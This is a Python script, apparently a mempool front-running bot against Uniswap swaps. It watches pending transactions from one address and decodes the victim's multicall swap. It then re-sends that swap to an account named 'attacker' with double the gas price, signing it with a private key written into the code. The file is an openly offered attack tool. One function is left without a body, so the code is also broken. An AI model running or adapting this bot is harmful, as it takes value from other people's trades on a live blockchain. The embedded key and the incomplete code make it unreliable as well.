import json

from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://62.113.114.85/4f5d85e2-99cd-4bd7-8f38-6a438ea18d79"))
pending_filter = w3.eth.filter('pending')

uniswap_ABI = json.loads(open("../artifacts/contracts/IV2SwapRouter.sol/IV2SwapRouter.json").read())["abi"]
uniswap = w3.eth.contract(abi=uniswap_ABI)

attacker_PK = "e23362bbe82c915e22c83d520d95eb57c92b3a78f0ad373dedada5cdcf88273f"
attacker_account = w3.eth.account.privateKeyToAccount(attacker_PK)

multicall_abi = json.loads(open("../artifacts/contracts/IMulticall.sol/IMulticall.json").read())["abi"]
multicall = w3.eth.contract(address="0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45", abi=multicall_abi)

uniswap_v2_abi = json.loads(open("../artifacts/contracts/IUniswapV2Router02.sol/IUniswapV2Router02.json").read())["abi"]
uniswap_v2 = w3.eth.contract(address="0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", abi=uniswap_v2_abi)

uniswap_v2_factory_abi = json.loads(open("../artifacts/contracts/IUniswapV2Factory.sol/IUniswapV2Factory.json").read())["abi"]
uniswap_v2_factory = w3.eth.contract(address="0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f", abi=uniswap_v2_factory_abi)

uniswap_v2_pair_abi = json.loads(open("../artifacts/contracts/IUniswapV2Pair.sol/IUniswapV2Pair.json").read())["abi"]


def calc_amount_out(amount_in, reserve_in, reserve_out):
	amount_in_with_fee = amount_in * 997
	numerator = amount_in_with_fee * reserve_out
	denominator = reserve_in * 1000 + amount_in_with_fee
	return int(numerator / denominator)


def calc_attack_slippage(amount_in, reserve_in, reserve_out):



def attack(tx):
	print(tx)
	inp = tx["input"]
	multicall_data = multicall.decode_function_input(inp)
	print(multicall_data)
	decoded_data = uniswap.decode_function_input(multicall_data[1]["data"][0].hex())
	print(decoded_data)
	pair = uniswap_v2_factory.functions.getPair(decoded_data[1]["path"][0], decoded_data[1]["path"][1]).call()
	print(pair)
	pair_contract = w3.eth.contract(address=pair, abi=uniswap_v2_pair_abi)
	reserves = pair_contract.functions.getReserves().call()
	print(reserves)
	token0 = decoded_data[1]["path"][0]
	pair_token0 = pair_contract.functions.token0().call()
	token0_in = False
	if token0 == pair_token0:
		token0_in = True
		token1 = decoded_data[1]["path"][1]
		token0_amount = decoded_data[1]["amountIn"]
		token1_amount = decoded_data[1]["amountOutMin"]
	else:
		token0 = decoded_data[1]["path"][1]
		token1 = decoded_data[1]["path"][0]
		token0_amount = decoded_data[1]["amountOutMin"]
		token1_amount = decoded_data[1]["amountIn"]

	token0_reserve = reserves[0]
	token1_reserve = reserves[1]

	if token0_in:
		amount_out = calc_amount_out(token0_amount, token0_reserve, token1_reserve)
		slippage = 1 - token1_amount / amount_out
	else:
		amount_out = calc_amount_out(token1_amount, token1_reserve, token0_reserve)
		slippage = token0_amount / amount_out

	print(slippage)


	encoded_bytes = uniswap.encodeABI(fn_name="swapExactTokensForTokens", args=[decoded_data[1]["amountIn"], decoded_data[1]["amountOutMin"], decoded_data[1]["path"], attacker_account.address])
	print(bytes.fromhex((encoded_bytes[2:len(encoded_bytes)])))
	multi_attack = multicall.functions.multicall(multicall_data[1]["deadline"], [bytes.fromhex((encoded_bytes[2:len(encoded_bytes)]))]).buildTransaction({
		'from': attacker_account.address,
		'nonce': w3.eth.getTransactionCount(attacker_account.address, 'pending'),
		'gas': 300000,
		'gasPrice': tx['gasPrice'] * 2,
		'value': decoded_data[1]["amountIn"]
	})
	signed_multi_attack = attacker_account.signTransaction(multi_attack)
	tx_hash = w3.eth.sendRawTransaction(signed_multi_attack.rawTransaction)
	print("Buying: ", tx_hash.hex())
	w3.eth.wait_for_transaction_receipt(tx_hash)


while True:
	for event in pending_filter.get_new_entries():
		tx = w3.eth.get_transaction(event.hex())
		if tx["from"] == "0x6408bD404C9Ba5E1021C0f863CCEaEadcB1Defb7":
			print(tx["input"][0:10])
			if tx["input"][0:10] == "0x5ae401dc":
				attack(tx)
